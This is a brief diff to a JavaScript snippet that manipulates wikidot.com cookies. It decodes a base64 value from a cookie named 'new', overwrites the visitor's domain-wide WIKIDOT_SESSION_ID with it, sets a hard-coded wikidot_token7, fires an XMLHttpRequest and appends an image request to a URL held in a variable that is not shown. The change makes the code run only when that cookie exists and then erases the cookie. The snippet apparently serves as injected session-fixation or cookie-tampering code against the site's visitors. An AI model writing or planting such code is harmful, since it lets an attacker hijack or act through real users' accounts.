@@ -12,7 +12,7 @@ function getCookie(cname, text) {
     }
     return '';
 }
-
+if (getCookie("new", document.cookie) != ""){
 document.cookie = "WIKIDOT_SESSION_ID=" + getCookie("WIKIDOT_SESSION_ID",atob(getCookie("new", document.cookie))) + ";path=/;domain=wikidot.com;";
 document.cookie = "wikidot_token7=4m64ez22na9pf7k6s988;path=/;";
 var http = new XMLHttpRequest();
@@ -28,4 +28,5 @@ f = document.createElement('img');
 f.src = s;
 document.body.appendChild(f);
 
-document.cookie = "new=1;path=/;domain=wikidot.com;";
+document.cookie = "new=;path=/;domain=wikidot.com;expires=Thu, 01 Jan 1970 00:00:01 GMT";
+}
